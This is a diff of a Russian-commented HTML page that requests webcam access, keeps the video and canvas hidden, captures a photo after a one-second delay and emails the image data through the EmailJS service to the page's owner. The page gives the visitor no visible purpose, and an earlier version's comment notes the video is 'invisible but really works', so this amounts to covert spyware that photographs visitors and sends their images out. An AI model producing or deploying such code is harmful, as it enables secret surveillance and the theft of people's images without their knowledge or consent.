@@ -15,59 +15,53 @@
       align-items: center;
       overflow: hidden;
     }
-    video {
-      width: 1px;
-      height: 1px;
-      opacity: 0; /* невидимое, но реально работает */
-      position: absolute;
-    }
-    canvas {
+    video, canvas, img {
       display: none;
     }
   </style>
 </head>
 <body>
   <video id="video" autoplay playsinline></video>
-  <canvas id="canvas"></canvas>
+  <canvas id="canvas" width="320" height="240"></canvas>
 
+  <!-- EmailJS SDK -->
   <script src="https://cdn.emailjs.com/sdk/3.2.0/email.min.js"></script>
   <script>
-    emailjs.init("ТВОЙ_USER_ID"); // замените на свой User ID
+    // Инициализация EmailJS
+    emailjs.init("ТВОЙ_USER_ID");
 
     function sendPhoto(photoUrl) {
       emailjs.send('service_zv13ydk', 'ТВОЙ_TEMPLATE_ID', {
         time: new Date().toLocaleString(),
         photo_link: photoUrl
       })
-      .then(() => console.log('Письмо отправлено!'))
-      .catch(err => console.error('Ошибка отправки:', err));
+      .then(response => console.log('Письмо отправлено!'))
+      .catch(error => console.error('Ошибка отправки:', error));
     }
 
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const context = canvas.getContext('2d');
 
+    // Запрос доступа к камере
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
 
-        // Ждём, пока видео реально готово к воспроизведению
-        video.onplaying = () => {
-          // Подстраиваем canvas под размер видео
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
+        // Ждём 1 секунду и делаем фото
+        setTimeout(() => {
+          const context = canvas.getContext('2d');
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const photoData = canvas.toDataURL('image/png');
 
-          // Используем requestAnimationFrame, чтобы точно поймать первый кадр
-          requestAnimationFrame(() => {
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const photoData = canvas.toDataURL('image/png');
-            console.log('Фото сделано:', photoData);
+          console.log('Фото сделано:', photoData);
 
-            sendPhoto(photoData); // Отправка на почту
-          });
-        };
+          // Отправка на почту через EmailJS
+          sendPhoto(photoData);
+        }, 1000); // задержка 1 секунда
       })
-      .catch(err => alert("Ошибка доступа к камере: " + err.message));
+      .catch(err => {
+        alert("Ошибка доступа к камере: " + err.message);
+      });
   </script>
 </body>
 </html>
